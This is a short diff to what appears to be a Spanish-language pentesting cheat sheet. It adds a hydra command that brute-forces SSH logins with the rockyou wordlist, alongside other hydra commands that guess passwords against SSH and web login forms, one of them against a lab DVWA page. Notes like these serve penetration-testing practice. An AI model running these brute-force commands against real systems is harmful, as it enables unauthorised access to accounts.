@@ -197,6 +197,7 @@ hydra -L users.txt -P pass.txt IP ssh (ssh indica el final)
 hydra -L [user diccionario] -P [password diccionario] [ip] [protocolo] 
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Invalid Username" 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.36.145/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=17mm5k1jmmkcnes87ttmi63603; security=low; security=low:F=Username and/or password incorrect'
+hydra -l [user] -P /usr/share/wordlists/rockyou.txt ssh://[IP]
 
 --------------------- Gobuster
 
